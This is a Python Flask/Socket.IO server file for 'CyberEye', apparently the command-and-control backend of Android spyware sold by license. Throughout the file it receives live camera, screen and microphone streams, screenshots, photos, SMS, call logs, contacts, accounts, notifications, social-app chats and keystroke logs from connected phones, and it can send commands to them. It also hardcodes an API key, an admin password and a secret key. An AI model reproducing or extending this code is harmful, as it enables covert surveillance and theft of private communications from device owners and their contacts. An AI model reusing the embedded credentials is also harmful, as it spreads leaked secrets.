import os
import json
import re
import time
import uuid
import base64
import requests
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_file, session
from flask_socketio import SocketIO, emit, join_room, leave_room
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cybereye-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent', allow_eio3=True, ping_timeout=60, ping_interval=25)

# --- CONFIGURATION ---
DB_FILE = 'database.json'
BLACKLIST = ["info", "services", "default_device", "web", "🌐", "web"]
GEMINI_API_KEY = "AIzaSyBsHMZ1SrAaMXdXScPGbycCZokkD5B3tP0"

database = {}
data_cache = {} # RAM Cache

# Connected clients map: device_id -> socket session ID (sid)
connected_devices = {}
sid_to_device = {}
connected_device_licenses = {}

def load_db():
    global database
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                database = json.load(f)
                for b in BLACKLIST:
                    for k in list(database.keys()):
                        if b in k.lower(): del database[k]
        except: database = {}
    else: database = {}

def save_db():
    try:
        temp_file = DB_FILE + ".tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(database, f, indent=2, ensure_ascii=False)
        os.replace(temp_file, DB_FILE)
    except Exception as e:
        print(f"Error saving database: {e}")

load_db()

# --- USERS & LICENSES DATABASE ---
import hashlib
USERS_DB_FILE = 'users_db.json'
users_database = {"users": {}, "licenses": {}}

def load_users_db():
    global users_database
    if os.path.exists(USERS_DB_FILE):
        try:
            with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
                users_database = json.load(f)
                if "users" not in users_database: users_database["users"] = {}
                if "licenses" not in users_database: users_database["licenses"] = {}
                if "reports" not in users_database: users_database["reports"] = []
                if "system_policy" not in users_database: 
                    users_database["system_policy"] = {
                        "maintenance_mode": False,
                        "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                        "maintenance_until": 0
                    }
        except:
            users_database = {"users": {}, "licenses": {}}
    else:
        users_database = {
            "users": {}, 
            "licenses": {},
            "system_policy": {
                "maintenance_mode": False,
                "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                "maintenance_until": 0
            }
        }
        save_users_db()

def save_users_db():
    try:
        temp_file = USERS_DB_FILE + ".tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(users_database, f, indent=2, ensure_ascii=False)
        os.replace(temp_file, USERS_DB_FILE)
    except Exception as e:
        print(f"Error saving users database: {e}")

def hash_password(password):
    return hashlib.sha256(password.encode('utf-8')).hexdigest()

def check_password(password, hashed):
    return hash_password(password) == hashed

load_users_db()

# --- ADMIN CREDENTIALS ---
ADMIN_EMAIL = "Admin@cybereye.co.in"
ADMIN_PASSWORD_HASH = hash_password("Cybereye@123")

@app.before_request
def check_maintenance_policy():
    # If maintenance is active, block non-admin routes
    policy = users_database.get("system_policy", {})
    if policy.get("maintenance_mode", False):
        # Exclude admin routes, static folder, login / logout and API calls for admin
        allowed_paths = [
            '/admin', '/admin/login', '/admin/logout', '/login', '/logout', '/static/',
            '/api/admin/apply_maintenance', '/api/admin/bulk_op', '/api/admin/list_users_keys',
            '/api/admin/create_user', '/api/admin/generate_license', '/api/admin/toggle_device_visibility'
        ]
        path = request.path
        is_allowed = any(path.startswith(p) for p in allowed_paths)
        if not is_allowed and not session.get('admin_logged', False):
            if request.is_json or path.startswith('/api/'):
                return jsonify({'error': 'System maintenance mode is active.', 'code': 503}), 503
            return render_template('maintenance.html', message=policy.get("maintenance_message"))

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized', 'code': 401}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged' not in session:
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized', 'code': 401}), 401
            return redirect(url_for('admin_login_page'))
        return f(*args, **kwargs)
    return decorated_function

def has_device_access(username, device_id):
    if not username: return False
    if username == ADMIN_EMAIL:
        return True
        
    user_data = users_database.get("users", {}).get(username, {})
    hidden_devices = user_data.get("hidden_devices", [])
    if device_id in hidden_devices:
        return False
        
    # Check 1: User explicitly bound devices list
    user_devices = user_data.get("devices", [])
    if device_id in user_devices:
        return True
        
    # Check 2: Get all active licenses assigned to this username
    user_licenses = [k for k, v in users_database.get("licenses", {}).items() if v.get("assigned_to") == username and v.get("is_active", True)]
    
    # Get device license key from persistent database
    device_data = database.get(device_id, {})
    device_license = device_data.get("license_key")
    
    # STRICT LICENSE MATCHING: Device must have a matching license key to be displayed
    return (device_license in user_licenses)

def run_async(val):
    return val

def get_and_parse_cloud_data(device_id, category):
    file_path = os.path.join("data", device_id, f"{category}.txt")
    if not os.path.exists(file_path): return None
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        parsed_list = []
        if category == "calls":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p:
                        num = p['Num']
                        norm_num = "".join(ch for ch in str(num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        parsed_list.append({
                            'number': num,
                            'name': name,
                            'duration': p.get('Dur','0s'),
                            'type': p.get('Type',''),
                            'date': p.get('Date','')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "sms":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'From' in p:
                        from_num = p['From']
                        norm_num = "".join(ch for ch in str(from_num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        address = f"{name} ({from_num})" if name else from_num
                        parsed_list.append({
                            'address': address,
                            'body': p.get('Msg',''),
                            'type': p.get('Type',''),
                            'date': p.get('Date','')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "apps":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Pkg' in p: parsed_list.append({'name': p.get('Name','Unknown'), 'package': p['Pkg']})
        elif category == "contacts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p: parsed_list.append({'name': p.get('Name','Unknown'), 'number': p['Num']})
        elif category == "accounts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p: parsed_list.append({'type': p.get('Type',''), 'name': p['Name']})
        elif category == "notifications":
            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'App' in p: parsed_list.append({'app': p['App'], 'title': p.get('Title',''), 'text': p.get('Msg',''), 'time': p.get('Time','')})
        elif "usage" in category:
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p: parsed_list.append({'name': p['Name'], 'package': p.get('Pkg',''), 'usage': p.get('Usage',''), 'ms': int(p.get('MS','0'))})
        elif category == "files":
            try:
                return json.loads(content)
            except:
                return []
        return parsed_list
    except: return None

def update_device_record(device_id, category, data):
    global database
    if not device_id or device_id.lower() in BLACKLIST: return
    if device_id not in database:
        database[device_id] = {}

    if "_id" not in database[device_id]: database[device_id]["_id"] = device_id
    if "lastSeen" not in database[device_id]: database[device_id]["lastSeen"] = int(time.time()*1000)
    if "info" not in database[device_id]: database[device_id]["info"] = {}
    if "refs" not in database[device_id]: database[device_id]["refs"] = {}
    if "media" not in database[device_id]: database[device_id]["media"] = {}
    if "logs" not in database[device_id]: database[device_id]["logs"] = []
    if "chats" not in database[device_id]: database[device_id]["chats"] = {}

    database[device_id]["lastSeen"] = int(time.time() * 1000)

    if category == "info" and isinstance(data, str):
        info = {}
        for line in data.split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                info[k.strip().lower()] = v.strip()
        database[device_id]["info"].update(info)
    elif category == "location" and isinstance(data, dict):
        if "location" not in database[device_id]: database[device_id]["location"] = {}
        database[device_id]["location"].update(data)
    elif category == "logs":
        database[device_id]["logs"].append({"text": str(data), "time": int(time.time()*1000)})
        database[device_id]["logs"] = database[device_id]["logs"][-100:]
    elif category == "media" and isinstance(data, dict):
        if "media" not in database[device_id]: database[device_id]["media"] = {}
        database[device_id]["media"].update(data)
    save_db()

# --- Socket.io Event Handlers ---
@socketio.on('connect')
def handle_connect():
    device_id = request.args.get('device_id')
    model = request.args.get('model', 'Unknown')
    manf = request.args.get('manf', 'Unknown')
    release = request.args.get('release', 'Unknown')
    license_key = request.args.get('license_key')
    
    if device_id:
        join_room(device_id)
        # Cleanly replace any previous socket session for this device
        old_sid = connected_devices.get(device_id)
        if old_sid and old_sid != request.sid:
            sid_to_device.pop(old_sid, None)
            print(f"[Socket.io] Replaced previous sid {old_sid} with new sid {request.sid} for device {device_id}")

        connected_devices[device_id] = request.sid
        sid_to_device[request.sid] = device_id
        
        # Enforce strict license matching on connect (no test auto-mapping bypass)
        
        # Auto-assign device if a valid license key is provided
        if license_key:
            license_key = license_key.strip()
            connected_device_licenses[device_id] = license_key
            
            # Persist license key inside the device database record
            if device_id not in database:
                database[device_id] = {"_id": device_id}
            database[device_id]["license_key"] = license_key
            save_db()
            
            if license_key in users_database.get("licenses", {}):
                username = users_database["licenses"][license_key].get("assigned_to")
                if username and username in users_database.get("users", {}):
                    if "devices" not in users_database["users"][username]:
                        users_database["users"][username]["devices"] = []
                    if device_id not in users_database["users"][username]["devices"]:
                        users_database["users"][username]["devices"].append(device_id)
                        save_users_db()
                        print(f"[RBAC] Device {device_id} auto-mapped to user: {username}")
        
        ip = request.remote_addr
        info_string = f"model: {model}\nmanufacturer: {manf}\nandroid: {release}\nadmin: false\nbattery: --%\nnotif_pending: 0\nip: {ip}\n"
        update_device_record(device_id, "info", info_string)
        update_device_record(device_id, "logs", "Device Connected via Socket.io")
        
        # Auto-sync settings to the device on connection with a small delay to prevent handshake race conditions
        settings = database.get(device_id, {}).get("settings", {})
        if settings.get("lock_track_enabled", False):
            def delayed_sync(sid, dev_id):
                socketio.sleep(1.5)
                print(f"[RBAC] Syncing lock_track enable command to newly connected device {dev_id}")
                socketio.emit('command', {'action': 'START_LOCK_TRACK'}, room=sid)
            socketio.start_background_task(delayed_sync, request.sid, device_id)
        print(f"[Socket.io] Device connected: {device_id} (Model: {model})")
        # Notify dashboard
        socketio.emit('device_status_change', {'device_id': device_id, 'online': True})

@socketio.on('disconnect')
def handle_disconnect():
    device_id = sid_to_device.pop(request.sid, None)
    if device_id:
        if connected_devices.get(device_id) == request.sid:
            connected_devices.pop(device_id, None)
            connected_device_licenses.pop(device_id, None)
            print(f"[Socket.io] Device disconnected: {device_id}")
            update_device_record(device_id, "logs", "Device Disconnected")
            # Notify dashboard
            socketio.emit('device_status_change', {'device_id': device_id, 'online': False})
        else:
            print(f"[Socket.io] Stale socket {request.sid} disconnected for {device_id}, active socket ({connected_devices.get(device_id)}) remains connected.")

@socketio.on('join_device_room')
def handle_join_device_room(data):
    if isinstance(data, dict):
        device_id = data.get('device_id')
    else:
        device_id = data
    if device_id:
        join_room(device_id)
        print(f"[Socket.io] Dashboard joined room: {device_id}")

@socketio.on('camera_frame')
def handle_camera_frame(data):
    device_id = sid_to_device.get(request.sid)
    if device_id:
        emit('camera_frame_relay', data, room=device_id, include_self=False)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    device_id = sid_to_device.get(request.sid)
    if device_id:
        emit('screen_frame_relay', data, room=device_id, include_self=False)

@socketio.on('ui_skeleton_frame')
def handle_ui_skeleton_frame(data):
    device_id = sid_to_device.get(request.sid)
    if device_id:
        emit('ui_skeleton_frame_relay', data, room=device_id, include_self=False)

@socketio.on('audio_frame')
def handle_audio_frame(data):
    device_id = sid_to_device.get(request.sid)
    if device_id:
        emit('audio_frame_relay', data, room=device_id, include_self=False)

@socketio.on('screenshot_captured')
def handle_screenshot_captured(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        raw_img = data.get("image")
        log_time = data.get("time", int(time.time() * 1000))
        if raw_img:
            if isinstance(raw_img, str):
                try:
                    img_bytes = base64.b64decode(raw_img)
                except Exception:
                    img_bytes = raw_img.encode('utf-8')
            elif isinstance(raw_img, list):
                img_bytes = bytes(raw_img)
            else:
                img_bytes = raw_img

            filename = f"screenshot_{log_time}.png"
            dir_path = os.path.join("data", device_id, "screenshot")
            os.makedirs(dir_path, exist_ok=True)
            save_path = os.path.join(dir_path, filename)
            with open(save_path, "wb") as f:
                f.write(img_bytes)
            
            rel_url = f"/api/device/{device_id}/file/screenshot/{filename}"
            fb_key = f"m_{log_time}"
            media_entry = {
                "time": log_time,
                "url": rel_url,
                "name": filename,
                "type": "screenshot",
                "path": save_path
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]: database[device_id]["media"] = {}
            database[device_id]["media"][fb_key] = media_entry
            save_db()
            
            socketio.emit('screenshot_received', {'device_id': device_id, 'url': rel_url, 'time': log_time, 'entry': media_entry}, room=device_id)

@socketio.on('photo_captured')
def handle_photo_captured(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        raw_img = data.get("image")
        lens = data.get("lens", "front")
        log_time = data.get("time", int(time.time() * 1000))
        if raw_img:
            if isinstance(raw_img, str):
                try:
                    img_bytes = base64.b64decode(raw_img)
                except Exception:
                    img_bytes = raw_img.encode('utf-8')
            elif isinstance(raw_img, list):
                img_bytes = bytes(raw_img)
            else:
                img_bytes = raw_img

            filename = f"photo_{lens}_{log_time}.jpg"
            dir_path = os.path.join("data", device_id, "image")
            os.makedirs(dir_path, exist_ok=True)
            save_path = os.path.join(dir_path, filename)
            with open(save_path, "wb") as f:
                f.write(img_bytes)
            
            rel_url = f"/api/device/{device_id}/file/image/{filename}"
            fb_key = f"m_{log_time}"
            media_entry = {
                "time": log_time,
                "url": rel_url,
                "name": filename,
                "type": "image",
                "path": save_path
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]: database[device_id]["media"] = {}
            database[device_id]["media"][fb_key] = media_entry
            save_db()
            
            socketio.emit('photo_received', {'device_id': device_id, 'url': rel_url, 'lens': lens, 'time': log_time, 'entry': media_entry}, room=device_id)

@socketio.on('file_list_data')
def handle_file_list_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        socketio.emit('file_list_relay', data, room=device_id, include_self=False)

def save_thumbnail_media(device_id, device_path, thumb_data):
    try:
        if not thumb_data or not device_id:
            return None
        
        img_bytes = None
        if isinstance(thumb_data, bytes):
            img_bytes = thumb_data
        elif isinstance(thumb_data, bytearray):
            img_bytes = bytes(thumb_data)
        elif isinstance(thumb_data, list):
            img_bytes = bytes(thumb_data)
        elif isinstance(thumb_data, str):
            clean_str = thumb_data
            if clean_str.startswith("data:"):
                clean_str = clean_str.split(",", 1)[-1]
            import base64
            img_bytes = base64.b64decode(clean_str)
            
        if not img_bytes:
            return None

        clean_name = os.path.basename(device_path.replace("\\", "/")) if device_path else "file_thumbnail.jpg"
        if not clean_name.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.bmp')):
            clean_name += ".jpg"
            
        filename = f"thumb_{int(time.time() * 1000)}_{clean_name}"
        
        thumb_dir = os.path.join("media", device_id, "thumbnail")
        os.makedirs(thumb_dir, exist_ok=True)
        
        file_path = os.path.join(thumb_dir, filename)
        with open(file_path, "wb") as f:
            f.write(img_bytes)
            
        rel_url = f"/api/media/stream/{device_id}/thumbnail/{filename}"
        
        fb_key = f"m_{int(time.time() * 1000)}_{uuid.uuid4().hex[:6]}"
        media_entry = {
            "time": int(time.time() * 1000),
            "url": rel_url,
            "name": clean_name,
            "type": "thumbnail",
            "category": "thumbnail",
            "path": device_path,
            "saved_path": file_path
        }
        
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "media" not in database[device_id]: database[device_id]["media"] = {}
        database[device_id]["media"][fb_key] = media_entry
        
        if "previews" not in database[device_id]: database[device_id]["previews"] = {}
        p_key = f"p_{int(time.time() * 1000)}"
        database[device_id]["previews"][p_key] = {
            "time": int(time.time() * 1000),
            "url": rel_url,
            "name": clean_name,
            "path": device_path
        }
        
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        save_db()
        socketio.emit('device_status_change', {'device_id': device_id})
        socketio.emit('media_updated', {'device_id': device_id}, room=device_id)
        return media_entry
    except Exception as e:
        print(f"[Thumbnail Save Error] {e}")
        return None

@socketio.on('file_preview_data')
def handle_file_preview_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        socketio.emit('file_preview_relay', data, room=device_id, include_self=False)
        thumb_val = data.get("thumbnail")
        dev_path = data.get("path", "")
        if thumb_val:
            import threading
            threading.Thread(target=save_thumbnail_media, args=(device_id, dev_path, thumb_val), daemon=True).start()

@socketio.on('speaker_pcm_chunk')
def handle_speaker_pcm_chunk(data):
    dev_id = data.get("device_id")
    if dev_id and dev_id in connected_devices:
        target_sid = connected_devices[dev_id]
        socketio.emit('speaker_pcm_chunk', data, room=target_sid)

@socketio.on('contacts_data')
@socketio.on('contacts_logs')
def handle_contacts_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        contacts = data.get("contacts", data.get("data", []))
        if device_id not in database: database[device_id] = {"_id": device_id}
        database[device_id]["contacts_cache"] = contacts
        
        # Save contacts.txt in data/<device_id>/
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "contacts.txt")
        lines = []
        for c in contacts:
            if isinstance(c, dict):
                lines.append(f"Name: {c.get('name','')} | Phone: {c.get('number', c.get('phone',''))}")
            else:
                lines.append(str(c))
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
            
        save_db()
        socketio.emit('contacts_received', {'device_id': device_id, 'contacts': contacts}, room=device_id)

@socketio.on('sms_data')
@socketio.on('sms_logs')
def handle_sms_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        sms = data.get("sms", data.get("data", []))
        if device_id not in database: database[device_id] = {"_id": device_id}
        database[device_id]["sms_cache"] = sms
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        database[device_id]["refs"]["sms"] = int(time.time() * 1000)
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        
        # Save sms.txt in data/<device_id>/
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "sms.txt")
        lines = []
        for s in sms:
            if isinstance(s, dict):
                lines.append(f"From: {s.get('address','')} | Msg: {s.get('body','')} | Date: {s.get('date','')} | Type: {s.get('type','')}\n---")
            else:
                lines.append(str(s))
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
            
        save_db()
        socketio.emit('sms_received', {'device_id': device_id, 'sms': sms}, room=device_id)
        socketio.emit('device_status_change', {'device_id': device_id})

@socketio.on('media_captured')
def handle_media_captured(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        b64 = data.get('data')
        category = data.get('category', 'image')
        media_type = data.get('type', category)
        if b64:
            try:
                img_bytes = base64.b64decode(b64)
                os.makedirs(os.path.join("media", device_id), exist_ok=True)
                ext = "png" if media_type == "screenshot" else "jpg"
                filename = f"{media_type}_{int(time.time()*1000)}.{ext}"
                file_path = os.path.join("media", device_id, filename)
                with open(file_path, "wb") as f:
                    f.write(img_bytes)
                fbKey = f"m_{int(time.time() * 1000)}_{uuid.uuid4().hex[:6]}"
                media_entry = {
                    "time": int(time.time() * 1000),
                    "url": f"/api/media/stream/{device_id}/{filename}",
                    "name": filename,
                    "type": media_type,
                    "path": file_path
                }
                if device_id not in database: database[device_id] = {"_id": device_id}
                if "media" not in database[device_id]: database[device_id]["media"] = {}
                database[device_id]["media"][fbKey] = media_entry
                database[device_id]["lastSeen"] = int(time.time() * 1000)
                save_db()
                socketio.emit('device_status_change', {'device_id': device_id})
                socketio.emit('media_updated', {'device_id': device_id}, room=device_id)
            except Exception as e:
                print(f"Error handling media_captured socket event: {e}")

@socketio.on('files_list')
def handle_files_list(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        files = data.get("data", [])
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "files.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(json.dumps(files, ensure_ascii=False))
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        database[device_id]["refs"]["files"] = int(time.time() * 1000)
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        save_db()
        socketio.emit('files_updated', {'device_id': device_id})

@socketio.on('call_logs_data')
@socketio.on('call_logs')
def handle_call_logs_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        calls = data.get("calls", data.get("data", []))
        if device_id not in database: database[device_id] = {"_id": device_id}
        database[device_id]["calls_cache"] = calls
        
        # Save call_logs.txt in data/<device_id>/
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "call_logs.txt")
        lines = []
        for c in calls:
            if isinstance(c, dict):
                lines.append(f"Number: {c.get('number','')} | Name: {c.get('name','')} | Date: {c.get('date','')} | Duration: {c.get('duration','')}s | Type: {c.get('type','')}\n---")
            else:
                lines.append(str(c))
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
            
        save_db()
        socketio.emit('call_logs_received', {'device_id': device_id, 'calls': calls}, room=device_id)

@socketio.on('apps_data')
@socketio.on('apps_logs')
def handle_apps_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        apps = data.get("apps", data.get("data", []))
        if device_id not in database: database[device_id] = {"_id": device_id}
        database[device_id]["apps_cache"] = apps
        
        # Save apps_list.txt in data/<device_id>/
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "apps_list.txt")
        lines = []
        for a in apps:
            if isinstance(a, dict):
                lines.append(f"App: {a.get('name', a.get('appName',''))} | Package: {a.get('package', a.get('packageName',''))}")
            else:
                lines.append(str(a))
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
            
        save_db()
        socketio.emit('apps_received', {'device_id': device_id, 'apps': apps}, room=device_id)

@socketio.on('accounts_data')
@socketio.on('accounts_logs')
def handle_accounts_data(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        accounts = data.get("accounts", data.get("data", []))
        if device_id not in database: database[device_id] = {"_id": device_id}
        database[device_id]["accounts_cache"] = accounts
        
        # Save accounts.txt in data/<device_id>/
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "accounts.txt")
        lines = []
        for acc in accounts:
            if isinstance(acc, dict):
                lines.append(f"Account: {acc.get('name','')} | Type: {acc.get('type','')}")
            else:
                lines.append(str(acc))
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
            
        save_db()
        socketio.emit('accounts_received', {'device_id': device_id, 'accounts': accounts}, room=device_id)

@socketio.on('social_logs')
@socketio.on('social_message')
def handle_social_logs(data):
    # data: {"platform": String, "contact": String, "text": String, "isSent": Boolean, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if not device_id and isinstance(data, dict):
        device_id = data.get("device_id")

    if device_id and data:
        platform = data.get("platform", "unknown")
        contact = data.get("contact", "Unknown")
        text = data.get("text", "")
        is_sent = data.get("isSent", False)
        msg_time = data.get("time", int(time.time() * 1000))

        if not text or not text.strip(): return

        platform_key = platform.replace(".", "_")
        contact_key = contact.replace(".", "_").replace(" ", "_")

        if device_id not in database: database[device_id] = {"_id": device_id}
        if "chats" not in database[device_id]: database[device_id]["chats"] = {}
        if platform_key not in database[device_id]["chats"]: database[device_id]["chats"][platform_key] = {}
        if contact_key not in database[device_id]["chats"][platform_key]:
            database[device_id]["chats"][platform_key][contact_key] = {
                "name": contact,
                "messages": {}
            }

        msg_id = f"m_{msg_time}"
        msg_entry = {
            "text": text,
            "isSent": is_sent,
            "type": "sent" if is_sent else "received",
            "time": msg_time
        }

        database[device_id]["chats"][platform_key][contact_key]["messages"][msg_id] = msg_entry
        database[device_id]["lastSeen"] = int(time.time() * 1000)

        # Save to text log file data/<device_id>/social_chats.txt
        dir_path = os.path.join("data", device_id)
        os.makedirs(dir_path, exist_ok=True)
        txt_path = os.path.join(dir_path, "social_chats.txt")
        time_str = time.strftime("%H:%M:%S", time.localtime(msg_time / 1000))
        log_line = f"App: {platform} | Contact: {contact} | Direction: {'SENT' if is_sent else 'RECV'} | Time: {time_str} | Msg: {text}\n---\n"
        with open(txt_path, "a", encoding="utf-8") as f:
            f.write(log_line)

        save_db()

        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform_key,
            'contact': contact_key,
            'text': text,
            'isSent': is_sent,
            'time': msg_time
        })
        socketio.emit('device_status_change', {'device_id': device_id})

@socketio.on('file_download_chunk')
def handle_file_download_chunk(data):
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        file_id = data.get("fileId")
        file_name = data.get("fileName", "download.bin")
        chunk_idx = data.get("chunkIndex", 0)
        total_chunks = data.get("totalChunks", 1)
        raw_chunk = data.get("data")

        if raw_chunk:
            if isinstance(raw_chunk, str):
                try:
                    chunk_bytes = base64.b64decode(raw_chunk)
                except Exception:
                    chunk_bytes = raw_chunk.encode('utf-8')
            elif isinstance(raw_chunk, list):
                chunk_bytes = bytes(raw_chunk)
            else:
                chunk_bytes = raw_chunk

            dir_path = os.path.join("data", device_id, "file")
            os.makedirs(dir_path, exist_ok=True)
            save_path = os.path.join(dir_path, file_name)

            mode = "wb" if chunk_idx == 0 else "ab"
            with open(save_path, mode) as f:
                f.write(chunk_bytes)

            progress = int(((chunk_idx + 1) / total_chunks) * 100)
            file_url = f"/api/device/{device_id}/file/file/{file_name}" if progress >= 100 else None

            socketio.emit('file_download_progress', {
                'device_id': device_id,
                'fileId': file_id,
                'fileName': file_name,
                'progress': progress,
                'isComplete': progress >= 100,
                'url': file_url
            }, room=device_id)

@socketio.on('keylogs')
def handle_keylogs(data):
    # data: {"pkg": String, "text": String, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        pkg = data.get("pkg", "unknown")
        text = data.get("text", "")
        log_time = data.get("time", int(time.time() * 1000))
        
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "keylogs" not in database[device_id]: database[device_id]["keylogs"] = {}
        
        log_id = f"kl_{log_time}"
        database[device_id]["keylogs"][log_id] = {
            "pkg": pkg,
            "text": text,
            "time": log_time
        }
        update_device_record(device_id, "logs", f"Keylog entry received from {pkg}")
        save_db()
        socketio.emit('keylog_received', {
            'device_id': device_id,
            'pkg': pkg,
            'text': text,
            'time': log_time
        })

@socketio.on('notification_logs')
@socketio.on('notification_logged')
def handle_notification_logged(data):
    # data: {"package": String, "title": String, "text": String, "time": String} or {"data": [...]}
    device_id = sid_to_device.get(request.sid)
    if not device_id and isinstance(data, dict):
        device_id = data.get("device_id")
    if device_id and data:
        if database.get(device_id, {}).get("settings", {}).get("notifications_enabled") == False:
            return

        if isinstance(data, dict) and "data" in data and isinstance(data["data"], list):
            items = data["data"]
        elif isinstance(data, list):
            items = data
        else:
            items = [data]

        file_path = os.path.join("data", device_id, "notifications.txt")
        os.makedirs(os.path.dirname(file_path), exist_ok=True)

        if device_id not in database: database[device_id] = {"_id": device_id}
        if "info" not in database[device_id]: database[device_id]["info"] = {}
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        if "notifications_cache" not in database[device_id] or not isinstance(database[device_id]["notifications_cache"], list):
            database[device_id]["notifications_cache"] = []

        with open(file_path, "a", encoding="utf-8") as f:
            for item in items:
                if not isinstance(item, dict): continue
                pkg = item.get("package") or item.get("app") or item.get("pkg") or "unknown"
                title = item.get("title", "")
                text = item.get("text") or item.get("msg", "")
                log_time = item.get("time", time.strftime("%H:%M:%S"))

                f.write(f"App: {pkg} | Title: {title} | Msg: {text} | Time: {log_time}\n---\n")

                notif_entry = {
                    'app': pkg,
                    'title': title,
                    'text': text,
                    'time': log_time
                }

                database[device_id]["notifications_cache"].append(notif_entry)
                database[device_id]["notifications_cache"] = database[device_id]["notifications_cache"][-500:]

                curr_count = int(database[device_id]["info"].get("notif_pending", 0)) + 1
                database[device_id]["info"]["notif_pending"] = str(curr_count)
                database[device_id]["refs"]["notifications"] = int(time.time() * 1000)
                database[device_id]["lastSeen"] = int(time.time() * 1000)

                socketio.emit('notification_received', {
                    'device_id': device_id,
                    'notification': notif_entry
                })

        save_db()

import math

